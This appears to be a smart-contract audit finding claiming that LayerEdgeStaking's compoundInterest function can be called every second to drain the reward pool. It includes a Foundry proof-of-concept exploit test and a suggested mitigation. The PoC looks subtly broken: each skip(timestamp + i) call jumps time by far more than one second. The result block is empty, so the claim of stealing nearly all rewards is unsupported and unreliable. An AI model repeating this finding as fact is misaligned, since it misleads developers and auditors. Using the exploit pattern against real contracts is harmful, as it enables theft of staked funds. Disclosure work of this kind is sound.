# High-frequency compoundInterest transactions allow unfair accumulation of reward tokens

### Summary

The compoundInterest function in LayerEdgeStaking.sol lacks a time-based restriction mechanism, allowing it to be called repeatedly in rapid succession without any enforced delay between calls. Ideally, such functions should have a minimum interval—such as six months or one year—before allowing another invocation to ensure fair and sustainable reward distribution. Without this protection, malicious users can exploit the system by triggering compoundInterest across multiple transactions within seconds, leading to an unfair accumulation of reward tokens and potential depletion of the reward pool.

### Root Cause

The root cause of this issue lies in the compoundInterest function, as seen [here](https://github.com/sherlock-audit/2025-05-layeredge/blob/main/edgen-staking/src/stake/LayerEdgeStaking.sol#L213). This function does not implement any minimum time restriction between consecutive calls. As a result, an attacker can repeatedly invoke compoundInterest in separate transactions with different timestamps, potentially every second. This behavior allows the attacker to accumulate a disproportionately large amount of rewards in a very short period, undermining the intended fairness and sustainability of the reward distribution mechanism.

### Internal Pre-conditions

1. The admin must set compoundingEnabled to true to activate the compound interest feature.
2. The admin must deposit the reward tokens into the contract.

These steps are expected to be performed by the admin, as they are explicitly defined in the setUp function within the Foundry test code.

```js
    function setUp() public {
        deployer = new DeployLayerEdgeStaking();
        (staking, helperConfig) = deployer.run();

        NetworkConfig memory config = helperConfig.getActiveNetworkConfig();

        token = LayerEdgeToken(config.stakingToken);
        admin = config.owner;
        vm.startPrank(admin);

        // Distribute tokens to users
        uint256 userAmount = 100_000 * 1e18; // 100k tokens per test user
        token.transfer(alice, userAmount);
        token.transfer(bob, userAmount);
        token.transfer(charlie, userAmount);
        token.transfer(david, userAmount);
        token.transfer(eve, userAmount);
        token.transfer(frank, userAmount);
        token.transfer(grace, userAmount);
        token.transfer(harry, userAmount);
        token.transfer(ian, userAmount);
        token.transfer(judy, userAmount);

        // Fund staking contract with reward tokens
        uint256 rewardAmount = 100_000 * 1e18; // 100k tokens for rewards
        token.approve(address(staking), rewardAmount);
        staking.depositRewards(rewardAmount);
        staking.setCompoundingStatus(true);
        staking.setMinStakeAmount(MIN_STAKE);
        vm.stopPrank();
    }
```

### External Pre-conditions

### Attack Path

1. The attacker immediately stakes 3,000 Ether worth of staking tokens into the staking contract, placing them in Tier 1 due to the high APY from first come first serve model.
2. The attacker repeatedly calls the compoundInterest function in separate transactions every second, potentially using automation tools such as a Bash script or task scheduler, performing up to 21,119 calls.
3. After compounding is complete, the attacker initiates the unstaking process, waits the required 7-day cooldown period, and then finalizes the unstake.
4. The attacker withdraws the significantly increased rewards, resulting in a substantial profit.

### Impact

High – An attacker can steal nearly all of the reward tokens.

### PoC

add this test into LayerEdgeStakingTest.t.sol

```js
    function test_stealViaCompoundInterest() public {
        address attacker = address(0x42);
        deal(address(token), attacker, 3000 ether);


        uint256 totalRewards = staking.rewardsReserve();
        uint256 balanceAttackerBefore = token.balanceOf(attacker);

        console2.log("balance of attacker before exploit: %d", balanceAttackerBefore);

        vm.startPrank(attacker);
        token.approve(address(staking), MIN_STAKE);
        staking.stake(MIN_STAKE);
        vm.stopPrank();

        uint256 timestamp = block.timestamp;


        for(uint256 i = 1; i < 21120; i++) {
            skip(timestamp + i);
            vm.prank(attacker);
            staking.compoundInterest();
        }

        (uint256 balance,,,) = staking.getUserInfo(attacker);

        vm.prank(attacker);
        staking.unstake(balance);

        timestamp = block.timestamp;
        skip(timestamp + 7 days);
        
        vm.prank(attacker);
        staking.completeUnstake(0);

        uint256 balanceAttackerAfter = token.balanceOf(attacker);

        console2.log("balance of attacker after exploit: %d",balanceAttackerAfter);

        uint256 profit = balanceAttackerAfter - balanceAttackerBefore;

        uint256 percentageProfitWithTwoDecimal = profit * 10000 / totalRewards;

        console2.log("attakcer can steal %d.%d% of the rewards via repeatedly call compoundInterest with separate transaction (best case for attacker is every 1 seconds in timestamp)", percentageProfitWithTwoDecimal / 100, percentageProfitWithTwoDecimal % 100);
        console2.log("attacker can steal the reward only in one day");
    }
```

run `forge test --mt test_stealViaCompoundInterest -vvv`

here's the result

```bash

```

### Mitigation

Implement a minimum time restriction per user between consecutive calls to the compoundInterest function, such as allowing each user to call it only once every six months or one year. This will prevent attackers from repeatedly invoking the function in rapid succession and unfairly accumulating excessive rewards.
